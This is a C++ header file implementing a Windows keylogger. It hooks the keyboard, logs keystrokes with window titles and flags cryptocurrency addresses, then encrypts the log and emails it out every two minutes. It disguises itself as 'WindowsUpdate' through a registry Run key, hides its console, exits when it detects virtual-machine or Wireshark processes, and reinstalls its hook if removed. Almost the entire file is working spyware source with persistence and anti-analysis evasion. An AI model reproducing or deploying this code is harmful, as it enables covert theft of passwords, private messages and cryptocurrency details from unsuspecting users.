#ifndef KEYBHOOKS_H
#define KEYBHOOKS_H

#include <iostream>
#include <fstream>
#include <windows.h>
#include <ctime>
#include <string>
#include <filesystem>
#include <regex>
#include <vector>
#include "timer.h"
#include "sendMail.h"
#include "encryption.h"

// Constants
const std::string LOG_FILE_PATH = std::string(std::getenv("APPDATA")) + "\\WindowsLogs\\keylog.dat";
const size_t MAX_LOG_SIZE = 1024 * 1024;  // 1MB log size limit
const std::string PERSISTENT_NAME = "WindowsUpdate";

// Global variables
std::string keylog = "";
HHOOK eHook = NULL;

// Regex patterns for detecting cryptocurrency addresses
std::regex btc_regex(R"((bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39})");
std::regex eth_regex(R"(0x[a-fA-F0-9]{40})");
std::regex ltc_regex(R"([LM3][a-km-zA-HJ-NP-Z1-9]{26,33})");
std::regex xmr_regex(R"([48][0-9A-Za-z]{93})");

// Get the current timestamp
std::string GetTimeStamp() {
    std::time_t now = std::time(nullptr);
    char timestamp[80];
    std::strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", std::localtime(&now));
    return std::string(timestamp);
}

// Get the title of the active window
std::string GetActiveWindowTitle() {
    char title[256];
    HWND hwnd = GetForegroundWindow();
    GetWindowTextA(hwnd, title, sizeof(title));
    return std::string(title);
}

// Check if the program is running inside a sandbox environment
bool IsRunningInSandbox() {
    const std::vector<const char*> sandboxes = { "vmtoolsd.exe", "vboxservice.exe", "wireshark.exe" };
    for (const auto* sandbox : sandboxes) {
        if (GetModuleHandleA(sandbox)) {
            return true;
        }
    }
    return false;
}

// Rotate logs if they exceed the size limit
void RotateLogs() {
    std::ifstream file(LOG_FILE_PATH, std::ios::binary | std::ios::ate);
    if (file) {
        size_t fileSize = file.tellg();
        if (fileSize > MAX_LOG_SIZE) {
            std::string backupFilePath = LOG_FILE_PATH + ".bak";
            std::filesystem::rename(LOG_FILE_PATH, backupFilePath);
            keylog.clear();
            helper::writeAppLog("Log rotated. Backup created: " + backupFilePath);
        }
    }
}

// Identify cryptocurrency addresses
std::string IdentifyCryptoAddress(const std::string& input) {
    if (std::regex_match(input, btc_regex)) return "[Bitcoin (BTC)] " + input;
    if (std::regex_match(input, eth_regex)) return "[Ethereum (ETH)] " + input;
    if (std::regex_match(input, ltc_regex)) return "[Litecoin (LTC)] " + input;
    if (std::regex_match(input, xmr_regex)) return "[Monero (XMR)] " + input;
    return input;
}

// Log keystrokes
void LogKey(const std::string& key) {
    RotateLogs();
    std::string entry = "[" + GetTimeStamp() + "] [" + GetActiveWindowTitle() + "] ";
    entry += IdentifyCryptoAddress(key) + "\n";
    keylog += entry;
}

// Send the keylog via email
void TimerSendMail() {
    if (keylog.empty()) return;

    std::string encrypted_log = Encryption::Encrypt(keylog);
    std::string last_file = IO::WriteLog(encrypted_log, LOG_FILE_PATH);

    if (last_file.empty()) {
        helper::writeAppLog("Failed to create log file.");
        return;
    }

    int result = Mail::SendMail(
        "Encrypted Log [" + last_file + "]",
        "Hi :) \nAttached is the encrypted keylog.\n",
        IO::GetOurPath(true) + last_file
    );

    if (result != 7) {
        helper::writeAppLog("Failed to send mail. Error code: " + helper::ToString(result));
    } else {
        keylog.clear();
    }
}

// Timer to send logs every 2 minutes
Timer MailTimer(TimerSendMail, 2 * 60 * 1000, Timer::infinite);

// Monitor the keyboard hook
void MonitorHook() {
    while (true) {
        if (!IsHooked()) {
            InstallHook();
            helper::writeAppLog("Hook reinstalled.");
        }
        Sleep(5000);
    }
}

// Keyboard hook procedure
LRESULT CALLBACK OurKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0) return CallNextHookEx(eHook, nCode, wParam, lParam);

    KBDLLHOOKSTRUCT* kbs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
    std::string key = Keys::KEYS[kbs->vkCode].Name;

    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
        if (kbs->vkCode == VK_RETURN) key = "[ENTER]\n";
        LogKey(key);
    } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
        if (kbs->vkCode == VK_CONTROL || kbs->vkCode == VK_SHIFT ||
            kbs->vkCode == VK_MENU || kbs->vkCode == VK_CAPITAL) {
            key.insert(1, "/");
            LogKey(key);
        }
    }
    return CallNextHookEx(eHook, nCode, wParam, lParam);
}

// Install the keyboard hook
bool InstallHook() {
    helper::writeAppLog("Installing hook...");
    MailTimer.Start(true);

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, OurKeyboardProc, GetModuleHandle(NULL), 0);
    return (eHook != NULL);
}

// Uninstall the keyboard hook
bool UninstallHook() {
    if (eHook) {
        UnhookWindowsHookEx(eHook);
        eHook = NULL;
        return true;
    }
    return false;
}

// Check if the hook is active
bool IsHooked() {
    return (eHook != NULL);
}

// Set up persistence in the registry
void SetupPersistence() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string destination = std::string(std::getenv("APPDATA")) + "\\" + PERSISTENT_NAME + ".exe";

    if (!std::filesystem::exists(destination)) {
        std::filesystem::copy_file(path, destination, std::filesystem::copy_options::overwrite_existing);
    }

    HKEY hKey;
    if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, PERSISTENT_NAME.c_str(), 0, REG_SZ,
                       reinterpret_cast<const BYTE*>(destination.c_str()), destination.size());
        RegCloseKey(hKey);
    } else {
        helper::writeAppLog("Failed to open registry key for persistence.");
    }
}

// Hide the console window
void HideConsole() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
}

// Start the keylogger
void StartKeylogger() {
    if (IsRunningInSandbox()) {
        helper::writeAppLog("Sandbox detected! Exiting.");
        exit(1);
    }

    SetupPersistence();
    HideConsole();

    if (!InstallHook()) {
        helper::writeAppLog("Failed to install hook.");
        exit(1);
    }

    MonitorHook();
}

#endif // KEYBHOOKS_H
